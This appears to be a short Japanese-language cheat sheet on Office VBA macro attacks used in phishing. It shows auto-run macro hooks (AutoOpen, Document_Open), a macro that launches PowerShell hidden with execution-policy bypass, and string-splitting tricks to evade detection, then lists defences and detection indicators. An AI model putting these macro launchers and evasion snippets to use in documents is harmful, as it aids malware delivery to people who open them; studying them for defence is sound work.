# Macro Payload Creation and Execution

**対応OS**: Windows

## 概要
Microsoft Officeのマクロ機能を使用した攻撃手法について解説します。この手法は主にフィッシング攻撃で使用されます。

## 基本的な手法

### VBAマクロの作成
```vb
Sub AutoOpen()
    ' マクロ実行時に自動的に実行される
End Sub

Sub Document_Open()
    ' ドキュメントを開いた時に実行される
End Sub
```

### PowerShellコマンドの実行
```vb
Sub ExecutePS()
    Dim str As String
    str = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
    Shell str, vbHide
End Sub
```

## 検知回避テクニック
```vb
' 文字列の分割
Dim p1 As String: p1 = "power"
Dim p2 As String: p2 = "shell"
Dim cmd As String: cmd = p1 & p2

' 環境変数の使用
Dim sysdir As String
sysdir = Environ("SYSTEMROOT")
```

## 防御策
- マクロの実行を制限する（推奨）
- デジタル署名されていないマクロを無効化
- アプリケーションのサンドボックス化
- EDRによる監視

## 検知方法
- マクロ内の不審な文字列
- 異常なプロセス起動
- PowerShellの不審な実行
- 外部接続の試行

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 